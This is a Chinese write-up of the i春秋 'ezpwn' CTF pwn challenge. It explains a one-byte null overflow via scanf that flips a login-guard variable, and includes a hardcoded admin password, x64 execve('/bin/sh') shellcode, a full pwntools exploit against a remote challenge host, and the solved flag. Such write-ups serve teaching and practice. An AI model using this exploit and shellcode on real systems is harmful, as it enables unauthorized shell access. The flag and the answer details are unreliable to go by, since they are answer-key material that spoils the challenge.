<meta name="referrer" content="no-referrer" />

# <centre>i春秋-ezpwn-wp</centre>

## 一、题目

平台地址：[选手训练营 - 网络安全竞赛|网络安全竞赛培训|信息安全竞赛培训-i春秋](https://www.ichunqiu.com/battalion)

题目内容：

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603260416321.png)

## 二、解题思路

老规矩查看文件属性

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603260416076.png)

`canary`和`NX`都没开

使用`ida64`打开分析

`main`函数：

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603260416841.png)

`menu()`函数：

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603260417885.png)

`Login()`函数：

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603260417468.png)

在`Login()`函数中得到了`admin`登录的密码`SuperSecurePassword123!`，但是`v5`变量被置为`1`，不让我们进入选项`1`登录`"1. Login as Admin"`

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603260417575.png)

到目前的思路肯定就是想办法将`v5`覆盖为`0`，从而登录上`admin`



根据`main`函数的逻辑来说，我们其实只有一个选择，也就是选项`"2. Send Message to Admin"`

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603260417426.png)

而这里

```
__isoc99_scanf("%56s", v4);
```

读取我们的输入到`v4`中，这里我们看栈中的布局可以发现`v4`距离`rbp`的距离是`rbp-0x40`,`v5`距离`rbp`的距离是`rbp-0x8`

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603260417460.png)

而选项`2`的`scanf`刚好可以让我们输入`56`个字符，也就是`0x40 - 0x8`个字符，写入`56`个字符刚好到`rbp-8`这个地址

也就是说当输入`56`字节时，`scanf`的`%56s`会写入`56`字节，并再加上一个`null`字节作为结束，所以会溢出到`v5`的第一个字节。在内存中，`v4`数组之后是`v5`，它们的地址是连续的。这样，`56`字节的输入将覆盖`v4`数组的`56`字节，然后在下一个字节（`v5`的第一个字节）写入`0`。这样，`v5`的值由原来的`1`变成了`0`。

所以整个流程就是：

1. 发送选项`2`，输入`56`字节的数据，覆盖`v5`为`0`。

2. 发送选项`1`，输入正确的密码，以`admin`身份登录。

3. 发送选项`4`，触发`Exec`函数，获取`shell`。

这里`exec`函数无法反编译，但是看汇编可以发现是让我们输入构造`shellcode`

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603260417443.png)

所以在我们发送4后还需要发送一串shellcode

这里可以利用`pwntools`自带的`shellcraft.sh()`来生成，也可以使用预先生成的`shellcode`。

例如，标准的`x64` `shellcode`如下：

```
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
```

这段`shellcode`对应执行`execve("/bin/sh", 0, 0)`



完整`exp`：

```
from pwn import *

#p = process('./pwn')
p = remote('39.106.48.123',39263)

p.sendlineafter(b'> ', b'2')
payload = b'A' * 56
p.sendlineafter(b'> ', payload)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Password: ', b'SuperSecurePassword123!')

p.sendlineafter(b'> ', b'4')

#shellcode = asm(shellcraft.sh())
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
p.sendlineafter(b'Shellcode: ', shellcode)
p.interactive()
```

## 三、flag

```
flag{f151995f-b491-4cbd-ae7c-8404a6ba4fe6}
```